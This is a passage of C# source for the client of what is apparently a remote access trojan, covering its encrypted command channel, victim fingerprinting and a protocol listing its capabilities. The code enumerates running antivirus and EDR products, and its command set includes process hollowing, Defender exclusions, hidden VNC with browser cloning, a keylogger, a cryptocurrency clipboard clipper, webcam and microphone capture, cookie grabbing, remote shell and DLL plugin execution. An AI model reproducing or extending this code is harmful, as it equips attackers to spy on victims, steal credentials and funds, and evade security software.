                    var ctrlWait  = _ctrlCh.Reader.WaitToReadAsync(linked.Token).AsTask();
                    var frameWait = _frameCh.Reader.WaitToReadAsync(linked.Token).AsTask();
                    await Task.WhenAny(ctrlWait, frameWait);
                    linked.Cancel();
                }
                catch (OperationCanceledException) when (!ct.IsCancellationRequested) { }
            }
        }
        catch (OperationCanceledException) when (ct.IsCancellationRequested) { }
        catch { /* WriteLoop failure — session CTS handles cleanup */ }
    }

    // ── SslWriterLoop: drains output channels onto the real SSL stream ────────────
    // This is the ONLY task that calls SslStream.WriteAsync.  It runs in the
    // background and may block on network I/O.  The WriteLoop is decoupled from it.
    private async Task SslWriterLoop(CancellationToken ct)
    {
        var ssl = _ssl;
        if (ssl == null) return;

        try
        {
            while (!ct.IsCancellationRequested)
            {
                // Priority: drain all pending ctrl bytes first
                while (_ctrlOutCh.Reader.TryRead(out var bytes))
                    await ssl.WriteAsync(bytes, ct);

                // Then write one frame
                if (_frameOutCh.Reader.TryRead(out var frameBytes))
                {
                    await ssl.WriteAsync(frameBytes, ct);
                    await ssl.FlushAsync(ct);
                    continue;
                }

                if (ct.IsCancellationRequested) break;

                // Nothing to write — flush once then wait for data on either output channel
                await ssl.FlushAsync(ct);

                using var linked = CancellationTokenSource.CreateLinkedTokenSource(ct);
                var ctrlWait  = _ctrlOutCh.Reader.WaitToReadAsync(linked.Token).AsTask();
                var frameWait = _frameOutCh.Reader.WaitToReadAsync(linked.Token).AsTask();
                await Task.WhenAny(ctrlWait, frameWait);
                linked.Cancel();
            }
        }
        catch (OperationCanceledException) when (ct.IsCancellationRequested) { }
        catch
        {
            // Unrecoverable SSL error — cancel the session so all loops exit
            // and RunAsync triggers a reconnect.
            try { _sessionCts?.Cancel(); } catch { }
        }
    }

    private async Task<Packet?> ReadPacketAsync(CancellationToken ct)
    {
        if (_ssl == null) return null;

        var lenBuf = new byte[4];
        int read = 0;
        while (read < 4)
        {
            int n = await _ssl.ReadAsync(lenBuf.AsMemory(read, 4 - read), ct);
            if (n == 0) return null;
            read += n;
        }

        int length = BitConverter.ToInt32(lenBuf, 0);
        if (length <= 0 || length > 500 * 1024 * 1024) return null; // 500 MB max

        var dataBuf = new byte[length];
        read = 0;
        while (read < length)
        {
            int n = await _ssl.ReadAsync(dataBuf.AsMemory(read, length - read), ct);
            if (n == 0) return null;
            read += n;
        }

        return JsonSerializer.Deserialize(Encoding.UTF8.GetString(dataBuf), SeroJson.Default.Packet);
    }

    // ── Cert Pinning ───────────────────────────────

    private static bool ValidateServerCert(object sender, X509Certificate? certificate, X509Chain? chain, SslPolicyErrors sslPolicyErrors)
    {
        // If no cert hash configured, accept any (dev mode)
        if (string.IsNullOrEmpty(Config.CertHash))
            return true;

        if (certificate == null) return false;

        // Compare SHA256 thumbprint
        var hash = SHA256.HashData(certificate.GetRawCertData());
        var certHash = Convert.ToHexString(hash);
        return string.Equals(certHash, Config.CertHash, StringComparison.OrdinalIgnoreCase);
    }

    // ── Helpers ─────────────────────────────────────

    private static string GetFriendlyOsName()
    {
        try
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            if (key != null)
            {
                var productName = key.GetValue("ProductName")?.ToString() ?? "";
                var displayVersion = key.GetValue("DisplayVersion")?.ToString() ?? "";
                var buildNumber = key.GetValue("CurrentBuildNumber")?.ToString() ?? "";

                // Windows 11 has build >= 22000 but ProductName may still say "Windows 10"
                if (int.TryParse(buildNumber, out int build) && build >= 22000)
                    productName = productName.Replace("Windows 10", "Windows 11");

                if (!string.IsNullOrEmpty(displayVersion))
                    return $"{productName} {displayVersion}";
                return productName;
            }
        }
        catch { }
        return Environment.OSVersion.ToString();
    }

    private static string GetDisplayUsername()
    {
        var name = Environment.UserName;
        // LocalSystem token can report as "SYSTEM" or the machine account (COMPUTERNAME$).
        // Normalize both to "SYSTEM" so the server always shows a recognizable label.
        if (string.Equals(name, "SYSTEM", StringComparison.OrdinalIgnoreCase) || name.EndsWith('$'))
            return "SYSTEM";
        return name;
    }

    private static string GetHwid()
    {
        var raw = $"{Environment.MachineName}:{Environment.UserName}:{Environment.ProcessorCount}";
        return Convert.ToBase64String(SHA256.HashData(Encoding.UTF8.GetBytes(raw)));
    }

    private static bool IsAdmin()
    {
        try
        {
            using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            return new System.Security.Principal.WindowsPrincipal(identity)
                .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        catch { return false; }
    }

    private static string GetAntivirus()
    {
        try
        {
            var avMap = new (string proc, string name)[]
            {
                ("MsMpEng", "Windows Defender"), ("SecurityHealthService", "Windows Defender"),
                ("avastui", "Avast"), ("AvastSvc", "Avast"),
                ("avgui", "AVG"), ("AVGSvc", "AVG"),
                ("bdagent", "Bitdefender"), ("bdservicehost", "Bitdefender"),
                ("ekrn", "ESET"), ("egui", "ESET"),
                ("mcshield", "McAfee"), ("mfemms", "McAfee"),
                ("NortonSecurity", "Norton"), ("nsWscSvc", "Norton"),
                ("SavService", "Sophos"), ("SAVAdminService", "Sophos"),
                ("avp", "Kaspersky"), ("kavfs", "Kaspersky"),
                ("MBAMService", "Malwarebytes"), ("mbamtray", "Malwarebytes"),
                ("PandaAgent", "Panda"),
                ("coreServiceShell", "Trend Micro"), ("ntrtscan", "Trend Micro"),
                ("CylanceSvc", "Cylance"),
                ("SentinelAgent", "SentinelOne"), ("SentinelServiceHost", "SentinelOne"),
                ("CSFalconService", "CrowdStrike"), ("CSFalconContainer", "CrowdStrike"),
                ("cbdefense", "Carbon Black"), ("RepMgr", "Carbon Black"),
                ("fmon", "F-Secure"), ("fsav32", "F-Secure"),
                ("dwengine", "Dr.Web"), ("dwservice", "Dr.Web"),
            };

            var detected = new HashSet<string>();
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    var name = p.ProcessName;
                    foreach (var (proc, avName) in avMap)
                    {
                        if (name.Equals(proc, StringComparison.OrdinalIgnoreCase))
                        {
                            detected.Add(avName);
                            break;
                        }
                    }
                }
                catch { }
                finally { p.Dispose(); }
            }

            return detected.Count > 0 ? string.Join(", ", detected) : "None";
        }
        catch
        {
            return "Unknown";
        }
    }

    public void Dispose()
    {
        _ssl?.Close();
        _tcp?.Close();
        _ctrlCh.Writer.TryComplete();
        _frameCh.Writer.TryComplete();
        _ctrlOutCh.Writer.TryComplete();
        _frameOutCh.Writer.TryComplete();
    }
}

// ── Protocol types ──────────────────────────────────

internal enum PacketType
{
    Heartbeat = 2,
    ClientInfo = 3,
    ShellOutput = 4,
    ElevationResult = 5,
    HeartbeatAck = 11,
    Disconnect = 14,
    RemoteShell = 20,
    RemoteFileExec = 21,
    Uninstall = 22,
    HollowExec = 23,
    UpdateClient = 24,
    RequestElevation = 30,
    RequestElevationLoop = 31,
    Ping = 32,
    Pong = 33,
    ActiveWindow = 34,
    CameraStatus  = 35,
    HardwareStats = 36,
    PerfMonStart  = 37,
    PerfMonStop   = 38,
    PerfMonData   = 39,

    RdpStart = 50,
    RdpStop = 51,
    RdpFrame = 52,
    RdpInput = 53,
    RdpClipboard = 54,
    RdpFrameAck = 55,
    RdpGetMonitors = 56,

    WcamStart = 60,
    WcamStop = 61,
    WcamFrame = 62,
    WcamDevices = 63,
    WcamFrameAck = 64,

    DefenderExclude = 70,
    PluginExec = 71,

    AutoTaskShell = 80,
    AutoTaskShellOutput = 81,

    HvncStart     = 100,
    HvncStop      = 101,
    HvncFrame     = 102,
    HvncFrameAck  = 103,
    HvncInput     = 104,
    HvncExec      = 105,
    HvncClipboard = 106,
    HvncProgress  = 107,

    TcpGetList             = 110,
    TcpListResult          = 111,
    TcpClose               = 112,
    TcpFirewallBlock       = 113,
    TcpFirewallUnblock     = 114,
    TcpFirewallListRules   = 115,
    TcpFirewallRulesResult = 116,

    StartupGetList    = 120,
    StartupListResult = 121,
    StartupDelete     = 122,

    FmList       = 130,
    FmListResult = 131,
    FmDownload   = 132,
    FmFileData   = 133,
    FmUpload     = 134,
    FmDelete     = 135,
    FmRename     = 136,
    FmMkDir      = 137,
    FmExec       = 138,
    FmHash       = 139,
    FmHashResult = 140,
    FmAck        = 141,
    FmShowHide   = 142,
    FmSetAttr    = 143,

    MicGetDevices    = 150,
    MicDevicesResult = 151,
    MicStart         = 152,
    MicStop          = 153,
    MicData          = 154,

    FunCmd    = 160,
    FunResult = 161,

    KeyloggerStart       = 170,
    KeyloggerStop        = 171,
    KeyloggerGetLogs     = 172,
    KeyloggerLogsResult  = 173,
    KeyloggerClear       = 174,
    KeyloggerListFiles   = 175,
    KeyloggerFilesResult = 176,
    KeyloggerGetFile     = 177,
    KeyloggerFileContent = 178,
    KeyloggerDeleteFile  = 179,

    TikTokComment      = 210,
    TikTokCommentAck   = 211,
    TikTokDetectCookie = 212,
    TikTokCookieResult = 213,
    CdpSignupStart     = 220,
    CdpSignupStatus    = 221,
    CdpSignupResult    = 222,

    SocksStart   = 200,
    SocksStop    = 201,
    SocksData    = 202,
    SocksClose   = 203,
    SocksConnOk  = 204,
    SocksConnErr = 205,

    ProcGetList    = 190,
    ProcListResult = 191,
    ProcKill       = 192,
    ProcSuspend    = 193,
    ProcResume     = 194,

    InstalledGetList    = 230,
    InstalledListResult = 231,
    InstalledUninstall  = 232,
    InstalledGetIcon    = 233,
    InstalledIconResult = 234,

    SvcGetList    = 240,
    SvcListResult = 241,
    SvcStart      = 242,
    SvcStop       = 243,
    SvcRestart    = 244,
    SvcDisable    = 245,
    SvcDelete     = 246,
    SvcAck        = 247,

    WinGetList    = 250,
    WinListResult = 251,
    WinAction     = 252,

    RegGetChildren    = 260,
    RegChildrenResult = 261,
    RegSetValue       = 262,
    RegDeleteValue    = 263,
    RegDeleteKey      = 264,
    RegCreateKey      = 265,
    RegAck            = 266,

    DevGetList    = 270,
    DevListResult = 271,
    DevUninstall  = 272,
    DevAck        = 273,

    ClipperSetConfig    = 180,
    ClipperGetStats     = 181,
    ClipperStatsResult  = 182,
    ClipperDetected     = 183,

    Screenshot       = 280,
    ScreenshotResult = 281,

    WindowNotifyKeywords = 282,
    WindowNotifyAlert    = 283,
}

internal class Packet
{
    public PacketType Type { get; set; }
    public string Data { get; set; } = string.Empty;
    public long Timestamp { get; set; } = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
}

internal class ClientInfoData
{
    public string OS { get; set; } = string.Empty;
    public string Username { get; set; } = string.Empty;
    public string MachineName { get; set; } = string.Empty;
    public string Hwid { get; set; } = string.Empty;
    public string IP { get; set; } = string.Empty;
    public string Payload { get; set; } = string.Empty;
    public string AuthKey { get; set; } = string.Empty;
    public bool IsAdmin { get; set; }
    public string Antivirus { get; set; } = string.Empty;
    public string IdPrefix { get; set; } = string.Empty;
    public string InstanceId { get; set; } = string.Empty;
}

internal class ShellOutputData
{
    public string Output { get; set; } = string.Empty;
    public int ExitCode { get; set; }
}

internal class RemoteFileExecData
{
    public string FileName { get; set; } = string.Empty;
    public string FileBase64 { get; set; } = string.Empty;
}

internal class UpdateClientData
{
    public string FileName { get; set; } = string.Empty;
    public string FileBase64 { get; set; } = string.Empty;
}

internal class HollowExecData
{
    public string FileName { get; set; } = string.Empty;
    public string FileBase64 { get; set; } = string.Empty;
    public string TargetProcess { get; set; } = string.Empty;
}

internal class PluginExecData
{
    public string DllBase64 { get; set; } = string.Empty;
    public string ExportName { get; set; } = "PluginMain";
}

internal class ElevationResultData
{
    public bool Success { get; set; }
    public string Message { get; set; } = string.Empty;
}

internal class RdpStartDataStub
{
    public int Quality   { get; set; } = 90;
    public int Fps       { get; set; } = 20;
    public int Monitor   { get; set; } = 0;
    public int Scale     { get; set; } = 100;
    public bool Mouse    { get; set; } = true;
    public bool Keyboard { get; set; } = true;
    public bool Clipboard{ get; set; } = true;
}

internal class WcamStartDataStub
{
    public int DeviceIndex { get; set; } = 0;
    public int Quality { get; set; } = 55;
    public int Fps { get; set; } = 15;
    public int MaxHeight { get; set; } = 0;
}

internal class WindowNotifyKeywordsStub
{
    public string[] Keywords { get; set; } = [];
}
internal class WindowNotifyAlertStub
{
    public string Title      { get; set; } = string.Empty;
    public string Keyword    { get; set; } = string.Empty;
    public string Screenshot { get; set; } = string.Empty;
}

internal class HvncStartDataStub
{
    public int  Quality      { get; set; } = 75;
    public int  Fps          { get; set; } = 20;
    public int  Width        { get; set; } = 1280;
    public int  Height       { get; set; } = 720;
    public bool CloneBrowser { get; set; } = true;
}

internal class HvncFrameDataStub
{
    public int    W { get; set; }
    public int    H { get; set; }
    public string J { get; set; } = string.Empty;
}

internal class HvncInputDataStub
{
    public string T          { get; set; } = string.Empty;
    public int    X          { get; set; }
    public int    Y          { get; set; }
    public int    Button     { get; set; }
    public bool   Down       { get; set; }
    public int    WheelDelta { get; set; }
    public int    VK         { get; set; }
}

internal class HvncExecDataStub
{
    public string Path         { get; set; } = string.Empty;
    public bool   CloneBrowser { get; set; } = false;
}

internal class HvncClipboardDataStub
{
    public string Text { get; set; } = string.Empty;
}

internal class HvncProgressDataStub
{
    public int    Pct   { get; set; }
    public string Label { get; set; } = string.Empty;
}

// ── JSON Source Generator (NativeAOT compatible) ────

[JsonSerializable(typeof(Packet))]
[JsonSerializable(typeof(ClientInfoData))]
[JsonSerializable(typeof(ShellOutputData))]
[JsonSerializable(typeof(RemoteFileExecData))]
[JsonSerializable(typeof(UpdateClientData))]
[JsonSerializable(typeof(HollowExecData))]
[JsonSerializable(typeof(PluginExecData))]
[JsonSerializable(typeof(ElevationResultData))]
[JsonSerializable(typeof(RdpStartDataStub))]
[JsonSerializable(typeof(WcamStartDataStub))]
[JsonSerializable(typeof(HvncStartDataStub))]
[JsonSerializable(typeof(HvncFrameDataStub))]
[JsonSerializable(typeof(HvncInputDataStub))]
[JsonSerializable(typeof(HvncExecDataStub))]
[JsonSerializable(typeof(HvncClipboardDataStub))]
[JsonSerializable(typeof(HvncProgressDataStub))]
// TCP Manager
[JsonSerializable(typeof(TcpEntryStub))]
[JsonSerializable(typeof(TcpListResultStub))]
[JsonSerializable(typeof(TcpCloseDataStub))]
// Startup Manager
[JsonSerializable(typeof(StartupEntryStub))]
[JsonSerializable(typeof(StartupListResultStub))]
[JsonSerializable(typeof(StartupDeleteDataStub))]
// File Manager
[JsonSerializable(typeof(FmEntryStub))]
[JsonSerializable(typeof(FmListResultStub))]
[JsonSerializable(typeof(FmDownloadDataStub))]
[JsonSerializable(typeof(FmFileDataResultStub))]
[JsonSerializable(typeof(FmUploadDataStub))]
[JsonSerializable(typeof(FmDeleteDataStub))]
[JsonSerializable(typeof(FmRenameDataStub))]
[JsonSerializable(typeof(FmMkDirDataStub))]
[JsonSerializable(typeof(FmExecDataStub))]
[JsonSerializable(typeof(FmHashDataStub))]
[JsonSerializable(typeof(FmHashResultStub))]
[JsonSerializable(typeof(FmAckDataStub))]
[JsonSerializable(typeof(FmShowHideDataStub))]
[JsonSerializable(typeof(FmSetAttrDataStub))]
// Microphone
[JsonSerializable(typeof(MicDeviceStub))]
[JsonSerializable(typeof(MicDevicesResultStub))]
[JsonSerializable(typeof(MicStartDataStub))]
[JsonSerializable(typeof(MicDataStub))]
// Fun
[JsonSerializable(typeof(FunCmdDataStub))]
[JsonSerializable(typeof(FunResultStub))]
// TikTok
[JsonSerializable(typeof(TikTokCommentStub))]
[JsonSerializable(typeof(TikTokCommentAckStub))]
[JsonSerializable(typeof(TikTokCookieResultStub))]
// SOCKS5
[JsonSerializable(typeof(SocksDataStub))]
[JsonSerializable(typeof(SocksConnStub))]
[JsonSerializable(typeof(SocksStartStub))]
// Process Manager
[JsonSerializable(typeof(ProcEntryStub))]
[JsonSerializable(typeof(ProcListResultStub))]
[JsonSerializable(typeof(ProcKillDataStub))]
[JsonSerializable(typeof(List<ProcEntryStub>))]
[JsonSerializable(typeof(List<string>))]
// Keylogger
[JsonSerializable(typeof(KeyloggerLogsResultStub))]
[JsonSerializable(typeof(KeyloggerFileInfo))]
[JsonSerializable(typeof(KeyloggerFilesResultStub))]
[JsonSerializable(typeof(KeyloggerGetFileStub))]
[JsonSerializable(typeof(KeyloggerFileContentStub))]
[JsonSerializable(typeof(List<KeyloggerFileInfo>))]
// Crypto Clipper
[JsonSerializable(typeof(ClipperSetConfigStub))]
[JsonSerializable(typeof(ClipperConfig))]
[JsonSerializable(typeof(ClipperDetectedStub))]
[JsonSerializable(typeof(ScreenshotResultStub))]
[JsonSerializable(typeof(ClipperStatsResultStub))]
// CDP Signup
[JsonSerializable(typeof(CdpSignupStatusStub))]
[JsonSerializable(typeof(CdpSignupResultStub))]
// Hardware Stats + PerfMon
[JsonSerializable(typeof(HardwareStatsStub))]
[JsonSerializable(typeof(PerfMonStartStub))]
[JsonSerializable(typeof(PerfMonDataStub))]
// Process Manager extended
[JsonSerializable(typeof(ProcSuspendResumeStub))]
// TCP Firewall
[JsonSerializable(typeof(TcpFirewallBlockStub))]
[JsonSerializable(typeof(TcpFirewallUnblockStub))]
[JsonSerializable(typeof(TcpFirewallRuleStub))]
[JsonSerializable(typeof(TcpFirewallRulesResultStub))]
[JsonSerializable(typeof(List<TcpFirewallRuleStub>))]
// Installed Programs
[JsonSerializable(typeof(InstalledAppStub))]
[JsonSerializable(typeof(InstalledListResultStub))]
[JsonSerializable(typeof(InstalledUninstallStub))]
[JsonSerializable(typeof(InstalledIconRequestStub))]
[JsonSerializable(typeof(InstalledIconResultStub))]
[JsonSerializable(typeof(List<InstalledAppStub>))]
// Service Manager
[JsonSerializable(typeof(ServiceEntryStub))]
[JsonSerializable(typeof(SvcListResultStub))]
[JsonSerializable(typeof(SvcActionStub))]
[JsonSerializable(typeof(SvcAckStub))]
[JsonSerializable(typeof(List<ServiceEntryStub>))]
// Window Manager
[JsonSerializable(typeof(WindowEntryStub))]
[JsonSerializable(typeof(WinListResultStub))]
[JsonSerializable(typeof(WinActionStub))]
[JsonSerializable(typeof(List<WindowEntryStub>))]
// Registry Editor
[JsonSerializable(typeof(RegValueStub))]
[JsonSerializable(typeof(RegChildrenResultStub))]
[JsonSerializable(typeof(RegGetChildrenStub))]
[JsonSerializable(typeof(RegSetValueStub))]
[JsonSerializable(typeof(RegDeleteValueStub))]
[JsonSerializable(typeof(RegDeleteKeyStub))]
[JsonSerializable(typeof(RegCreateKeyStub))]
[JsonSerializable(typeof(RegAckStub))]
[JsonSerializable(typeof(List<RegValueStub>))]
[JsonSerializable(typeof(List<string>))]
// Device Manager
[JsonSerializable(typeof(DeviceEntryStub))]
[JsonSerializable(typeof(DevListResultStub))]
[JsonSerializable(typeof(DevUninstallStub))]
[JsonSerializable(typeof(DevAckStub))]
[JsonSerializable(typeof(List<DeviceEntryStub>))]
// Window Notify
[JsonSerializable(typeof(WindowNotifyKeywordsStub))]
[JsonSerializable(typeof(WindowNotifyAlertStub))]
internal partial class SeroJson : JsonSerializerContext { }

internal class CdpSignupStatusStub { public string Step { get; set; } = ""; public string Message { get; set; } = ""; }
internal class CdpSignupResultStub  { public bool Success { get; set; } public string Account { get; set; } = ""; public string Cookie { get; set; } = ""; public string Error { get; set; } = ""; }

// ── Hardware Stats + PerfMon ─────────────────────────
internal class HardwareStatsStub { public float CpuUsage { get; set; } public long RamUsed { get; set; } public long RamTotal { get; set; } public string CpuName { get; set; } = ""; public string GpuName { get; set; } = ""; public int IdleSeconds { get; set; } }
internal class PerfMonStartStub  { public int IntervalMs { get; set; } = 1000; }
internal class PerfMonDataStub   { public float CpuUsage { get; set; } public long RamUsed { get; set; } public long RamTotal { get; set; } public long NetworkSentKB { get; set; } public long NetworkRecvKB { get; set; } }

// ── Process Manager extended ──────────────────────────
internal class ProcSuspendResumeStub { public int Pid { get; set; } }

// ── TCP Firewall ──────────────────────────────────────
internal class TcpFirewallBlockStub   { public string ProcessName { get; set; } = ""; public int Port { get; set; } public string RemoteIp { get; set; } = ""; public string Direction { get; set; } = "both"; }
internal class TcpFirewallUnblockStub { public string RuleName { get; set; } = ""; }
internal class TcpFirewallRuleStub    { public string RuleName { get; set; } = ""; public string ProcessName { get; set; } = ""; public int Port { get; set; } public string Direction { get; set; } = ""; }
internal class TcpFirewallRulesResultStub { public List<TcpFirewallRuleStub> Rules { get; set; } = []; }

// ── Installed Programs ────────────────────────────────
internal class InstalledAppStub       { public string Name { get; set; } = ""; public string Version { get; set; } = ""; public string Publisher { get; set; } = ""; public string InstallDate { get; set; } = ""; public string UninstallString { get; set; } = ""; public string IconB64 { get; set; } = ""; public bool Verified { get; set; } = false; }
internal class InstalledListResultStub{ public List<InstalledAppStub> Apps { get; set; } = []; }
internal class InstalledUninstallStub { public string UninstallString { get; set; } = ""; }
internal class InstalledIconRequestStub { public string Name { get; set; } = ""; }
internal class InstalledIconResultStub  { public string Name { get; set; } = ""; public string IconB64 { get; set; } = ""; }

// ── Service Manager ───────────────────────────────────
internal class ServiceEntryStub   { public string Name { get; set; } = ""; public string DisplayName { get; set; } = ""; public string Status { get; set; } = ""; public string StartType { get; set; } = ""; public string Description { get; set; } = ""; public string LogOnAs { get; set; } = ""; }
internal class SvcListResultStub  { public List<ServiceEntryStub> Services { get; set; } = []; }
internal class SvcActionStub      { public string ServiceName { get; set; } = ""; }
internal class SvcAckStub         { public bool Success { get; set; } public string Error { get; set; } = ""; }

// ── Window Manager ────────────────────────────────────
internal class WindowEntryStub    { public long Handle { get; set; } public string Title { get; set; } = ""; public string ClassName { get; set; } = ""; public int Pid { get; set; } public bool Visible { get; set; } public string IconB64 { get; set; } = ""; public string ProcessName { get; set; } = ""; }
internal class WinListResultStub  { public List<WindowEntryStub> Windows { get; set; } = []; }
internal class WinActionStub      { public long Handle { get; set; } public string Action { get; set; } = ""; }

// ── Registry Editor ───────────────────────────────────
internal class RegValueStub           { public string Name { get; set; } = ""; public string ValueType { get; set; } = ""; public string Data { get; set; } = ""; }
internal class RegChildrenResultStub  { public string KeyPath { get; set; } = ""; public List<string> SubKeys { get; set; } = []; public List<RegValueStub> Values { get; set; } = []; public string Error { get; set; } = ""; }
internal class RegGetChildrenStub     { public string KeyPath { get; set; } = ""; }
internal class RegSetValueStub        { public string KeyPath { get; set; } = ""; public string Name { get; set; } = ""; public string ValueType { get; set; } = "REG_SZ"; public string Data { get; set; } = ""; }
internal class RegDeleteValueStub     { public string KeyPath { get; set; } = ""; public string Name { get; set; } = ""; }
internal class RegDeleteKeyStub       { public string KeyPath { get; set; } = ""; }
internal class RegCreateKeyStub       { public string KeyPath { get; set; } = ""; }
internal class RegAckStub             { public bool Success { get; set; } public string Error { get; set; } = ""; }

// ── Device Manager ────────────────────────────────────
internal class DeviceEntryStub   { public string DeviceId { get; set; } = ""; public string Name { get; set; } = ""; public string Class { get; set; } = ""; public string Status { get; set; } = ""; public string Manufacturer { get; set; } = ""; }
internal class DevListResultStub { public List<DeviceEntryStub> Devices { get; set; } = []; }
internal class DevUninstallStub  { public string DeviceId { get; set; } = ""; }
internal class DevAckStub        { public bool Success { get; set; } public string Error { get; set; } = ""; }
